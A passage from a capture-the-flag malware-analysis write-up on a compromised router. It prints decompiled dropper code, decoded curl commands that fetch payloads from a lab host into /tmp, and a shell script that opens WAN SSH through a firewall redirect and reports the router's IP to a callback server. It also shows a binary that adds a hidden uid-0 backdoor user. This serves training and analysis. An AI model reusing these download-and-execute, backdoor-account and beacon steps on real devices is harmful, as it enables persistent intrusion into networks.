</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl</span>(file_1,<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl</span>(file_2,<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, I grabbed the contents of the two URLs and files from the memory of the binary, along with the key used to XOR them. I plugged all of them into CyberChef, and got the following results:</p>
<p><img src="./images/6-cyberchef_decode.png" alt="CyberChef Decode"></p>
<p>The first command (translated) is <code>curl http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00 &gt; /tmp/reanimate.sh</code></p>
<p>The second command (translated) is <code>curl http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00 &gt; /tmp/dead_reanimated</code></p>
<p>I ran both of these commands, and was able to retrieve the two files.</p>
<h2 id="reanimatesh">reanimate.sh</h2>
<p>The <code>reanimate.sh</code> script looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>WAN_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show pppoe-wan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>ROUTER_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show br-lan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CONFIG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;config redirect             \n\t              
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest &#39;lan&#39;           \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option target &#39;DNAT&#39;        \n\t 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option name &#39;share&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src &#39;wan&#39;            \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src_dport &#39;61337&#39;    \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_port &#39;22&#39;       \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option family &#39;ipv4&#39;        \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	list proto &#39;tcpudp&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_ip &#39;</span><span style="color:#e6db74">${</span>ROUTER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -e $CONFIG &gt;&gt; /etc/config/firewall
</span></span><span style="display:flex;"><span>/etc/init.d/firewall restart
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#34;auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;ip&#34;:&#34;&#39;</span><span style="color:#e6db74">${</span>WAN_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;}&#39;</span> http://configs.router.htb/reanimate
</span></span></code></pre></div><p>The code creates a firewall rule that redirects traffic from port 61337 to port 22, allowing SSH access to the router from the WAN. It then sends a POST request to <a href="http://configs.router.htb/reanimate" target="_blank">http://configs.router.htb/reanimate</a>, with the WAN IP address of the router, presumably to notify the attackers that the router is back online.</p>
<p>If we Base64 decode the auth token, we get <code>HTB{Z0mb13s_h4v3_inf</code>, which is the first half of the flag.</p>
<h2 id="dead_reanimated">dead_reanimated</h2>
<p>The <code>dead_reanimated</code> binary is a MIPS32 binary, just like <code>dead-reanimation</code>.  I loaded it into Ghidra, and began analyzing it.  This binary has a main function which Ghidra was able to identify, and it looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>pFVar4;
</span></span><span style="display:flex;"><span>  __uid_t _Var5;
</span></span><span style="display:flex;"><span>  passwd <span style="color:#f92672">*</span>ppVar6;
</span></span><span style="display:flex;"><span>  undefined4 uVar7;
</span></span><span style="display:flex;"><span>  undefined uStack_169;
</span></span><span style="display:flex;"><span>  undefined4 local_168;
</span></span><span style="display:flex;"><span>  undefined auStack_164 [<span style="color:#ae81ff">252</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_68 [<span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> acStack_3c [<span style="color:#ae81ff">28</span>];
</span></span><span style="display:flex;"><span>  undefined4 local_20;
</span></span><span style="display:flex;"><span>  undefined4 local_1c;
</span></span><span style="display:flex;"><span>  undefined4 local_18;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_20._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;z&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;m&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;b&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;l&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_68,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(acStack_3c,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(acStack_3c);
</span></span><span style="display:flex;"><span>  pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init_crypto_lib</span>(auStack_68,acStack_3c,pvVar2);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_init</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x271f</span>,pvVar2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_perform</span>(iVar3);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_cleanup</span>(iVar3);
</span></span><span style="display:flex;"><span>    pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar4);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      _Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((_Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ppVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ppVar6 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>                );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(pFVar4,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pvVar2,pvVar2);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar7;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ghidra does a pretty good job of decompiling this function.  First, the function initializes a crypto library, as seen in these lines:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(auStack_68,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(acStack_3c,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(acStack_3c);
</span></span><span style="display:flex;"><span>pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">init_crypto_lib</span>(auStack_68,acStack_3c,pvVar2);
</span></span></code></pre></div><p>The third argument to the <code>init_crypto_lib</code> library is then used as an argument to <code>cURL</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x271f</span>,pvVar2);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_perform</span>(iVar3);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_cleanup</span>(iVar3);
</span></span></code></pre></div><p>The code then checks to make sure that the hostname of the router is <!-- raw HTML omitted -->HSTERUNI-GW-01<!-- raw HTML omitted -->, and that the user is root.  It returns -1 if either of these conditions are not met.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar4);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>(<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    _Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((_Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ...
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If both of these conditions are met, the code then checks to see if the user <code>zombie_lord</code> exists.  If it does not, it installs the <code>shadow-useradd</code> package, and creates the user.  It sets the password to the same value as the crypto key that was passed to cURL earlier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ppVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ppVar6 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fprintf</span>(pFVar4,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pvVar2,pvVar2);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>The next thing to do is reverse the crypto library, and figure out what the key is.  The crypto library is fairly simple, and can be seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">key_rounds_init</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,undefined <span style="color:#f92672">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar5;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar6;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar7;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_1);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  puVar4 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>puVar4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar3;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    puVar4 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar3;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  iVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    iVar7 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">%</span> (<span style="color:#66d9ef">int</span>)sVar2;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">trap</span>(<span style="color:#ae81ff">0x1c00</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pbVar6 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar3;
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar6;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    iVar5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">int</span>)param_1[iVar7] <span style="color:#f92672">+</span> (uint)bVar1 <span style="color:#f92672">+</span> iVar5) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x100</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar6 <span style="color:#f92672">=</span> param_2[iVar5];
</span></span><span style="display:flex;"><span>    param_2[iVar5] <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">perform_rounds</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2,<span style="color:#66d9ef">int</span> param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar4;
</span></span><span style="display:flex;"><span>  uint uVar5;
</span></span><span style="display:flex;"><span>  uint uVar6;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>  uVar6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (sVar4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; sVar4 <span style="color:#f92672">!=</span> sVar2; sVar4 <span style="color:#f92672">=</span> sVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    uVar5 <span style="color:#f92672">=</span> uVar5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    pbVar3 <span style="color:#f92672">=</span> (byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar5);
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>    uVar6 <span style="color:#f92672">=</span> bVar1 <span style="color:#f92672">+</span> uVar6 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar6);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar6) <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_3 <span style="color:#f92672">+</span> sVar4) <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> ((uint)bVar1 <span style="color:#f92672">+</span> (uint)<span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#f92672">^</span> param_2[sVar4];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We could go through the trouble of reversing this, but if this is a standard crypto algorithm, we should be able to find it and use a pre-existing implementation.</p>
<p>I plugged the Ghidra decompilation directly into ChatGPT and asked it to identify the algorithm.  It returned the following:</p>
<p><img src="./images/7-chatgpt_question.png" alt="ChatGPT Question"></p>
<p><img src="./images/8-chatgpt_response.png" alt="ChatCPT Answer"></p>
<p>Now that we know the encryption algorithm is RC4, we can use a pre-existing implementation to decrypt the data.  I grabbed the key and the data to decrypt from the binary, and plugged them into CyberChef:</p>
